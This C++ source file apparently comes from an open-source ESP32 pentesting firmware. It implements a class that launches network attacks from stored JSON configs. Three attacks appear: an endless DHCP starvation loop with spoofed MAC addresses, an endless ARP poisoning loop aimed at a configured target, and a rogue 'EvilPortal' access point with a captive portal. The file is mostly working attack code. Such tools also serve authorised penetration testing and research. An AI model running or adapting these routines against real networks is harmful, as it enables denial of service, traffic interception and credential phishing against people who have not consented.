/*
 * This file is part of the Capibara zero (https://github.com/CapibaraZero/fw or
 * https://capibarazero.github.io/). Copyright (c) 2024 Andrea Canale.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "network_attacks.hpp"

#include <Arduino.h>
#include <ArduinoJson.h>

#include "../../include/debug.h"
#include "DHCPGlutton.hpp"
#include "arp_poisoner.hpp"
#include "posixsd.hpp"

#define MDNS_NAME "esp.lan"
#define EVIL_PORTAL_CONFIG_FILE "/captive_portal/config.json"
#define STATIC_PATH "/captive_portal"
#define DEFAULT_EVILPORTAL_AP_SSID "capibaraZero"
#define DHCP_GLUTTON_CONFIG_FILE "/dhcp_glutton/config.json"
#define ARP_POISONING_CONFIG_FILE "/arp_poisoner/config.json"

NetworkAttacks::NetworkAttacks(/* args */) {}

NetworkAttacks::~NetworkAttacks() {}

size_t NetworkAttacks::connect_to_wifi(const char *config) {
  File dhcp_glutton_config = open(config, "r");
  JsonDocument doc;
  DeserializationError error = deserializeJson(doc, dhcp_glutton_config);
  bool ret = 2;
  if (error) {
    LOG_ERROR(error.c_str());
    ret = 0;
  } else if (doc["ssid"].isNull() || doc["password"].isNull()) {
    ret = 1;
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.begin((const char *)doc["ssid"], (const char *)doc["password"]);
    LOG_INFO("Connecting to WiFi network");
    while (WiFi.status() != WL_CONNECTED);
    LOG_INFO("Connected!");
  }
  return ret;
}

void NetworkAttacks::create_default_ap() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(DEFAULT_EVILPORTAL_AP_SSID);
}

void NetworkAttacks::create_ap() {
  File evilportal_config = open(EVIL_PORTAL_CONFIG_FILE, "r");
  JsonDocument doc;
  DeserializationError error = deserializeJson(doc, evilportal_config);
  if (error) {
    LOG_ERROR(
        "Error reading captive portal config. Using default configuration");
    create_default_ap();
    return;
  }
  if (doc["ssid"].isNull() || doc["password"].isNull()) {
    LOG_ERROR("Invalid EvilPortal configuration. Using default configuration");
    create_default_ap();
    return;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP((const char *)doc["ssid"], (const char *)doc["password"]);
}

ARPoisonerConfig NetworkAttacks::get_arp_config() {
  File arp_poisoner_config = open(ARP_POISONING_CONFIG_FILE, "r");
  JsonDocument doc;
  DeserializationError error = deserializeJson(doc, arp_poisoner_config);
  ARPoisonerConfig arp_config;
  if (error) {
    arp_config.missing = true;
    LOG_ERROR(error.c_str());
  } else if (doc["target_ip"].isNull() || doc["target_mac"].isNull()) {
    arp_config.invalid = true;
  } else {
      for (uint8_t i = 0; i < 4; i++) {
        arp_config.dest_ip[i] = doc["target_ip"][i];
      }
      for (uint8_t i = 0; i < 6; i++) {
        arp_config.dest_mac[i] = doc["target_mac"][i];
      }
      if (!doc["send_time"].isNull()) {
        arp_config.send_time = doc["send_time"];
      }
  }
  return arp_config;
}
int NetworkAttacks::dhcp_starvation() {
  int ret = connect_to_wifi(DHCP_GLUTTON_CONFIG_FILE);
  if(ret != 2) {
    return ret;
  }
  DHCPGlutton dhcp_dos = DHCPGlutton();
  for (;;) {
    dhcp_dos.random_mac_address_spoof();
    dhcp_dos.send_dhcp_request();
    generated_clients++;
    delay(500);  // Reduce redundant connections(Sometimes ESP get same IP due
                 // to weak random)
  }
}

void NetworkAttacks::init_evilportal() {
  create_ap();
  evilPortal = new EvilPortal(MDNS_NAME, STATIC_PATH);
}

void NetworkAttacks::start_evilportal() { evilPortal->start_portal(); }

void NetworkAttacks::kill_evilportal() {
  delete evilPortal;
  evilPortal = nullptr;
  WiFi.softAPdisconnect(true);
}

size_t NetworkAttacks::start_arp_poisoning() {
  connect_to_wifi(ARP_POISONING_CONFIG_FILE);
  ARPoisonerConfig config = get_arp_config();

  size_t ret = 2;
  if(config.missing) {
    ret = 0;
  } else if(config.invalid){
    ret = 1;
  }

  if(ret != 2)
    return ret;

  ARP_poisoner poisoner = ARP_poisoner();
  while (true) {
    poisoner.send_arp_packet(config.dest_ip, config.dest_mac);
    delay(config.send_time);
  }
}